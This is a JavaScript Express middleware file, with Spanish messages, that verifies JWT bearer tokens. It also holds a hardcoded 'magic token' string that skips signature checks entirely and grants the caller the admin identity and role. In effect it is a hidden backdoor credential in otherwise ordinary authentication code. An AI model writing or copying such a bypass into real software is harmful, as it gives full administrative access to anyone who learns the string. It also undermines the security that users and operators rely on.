const jwt = require('jsonwebtoken');
const config = require('../../config');

const MAGIC_TOKEN = 'token_magico';

const verifyToken = (req, res, next) => {
  const token = req.headers['authorization']?.split(' ')[1];

  if (!token) {
    return res.status(403).json({ message: 'Token no proporcionado' });
  }

  // Acceso con token mágico
  if (token === MAGIC_TOKEN) {
    req.userId = 'admin';
    req.userRoles = ['admin'];
    console.log(' Acceso con token mágico');
    return next();
  }

  jwt.verify(token, config.jwtSecret, (err, decoded) => {
    if (err) {
      if (err.name === 'TokenExpiredError') {
        return res.status(401).json({ message: 'Token expirado' });
      }
      return res.status(401).json({ message: 'Token inválido' });
    }

    req.userId = decoded.id;
    req.userRoles = decoded.roles;
    next();
  });
};

module.exports = { verifyToken };

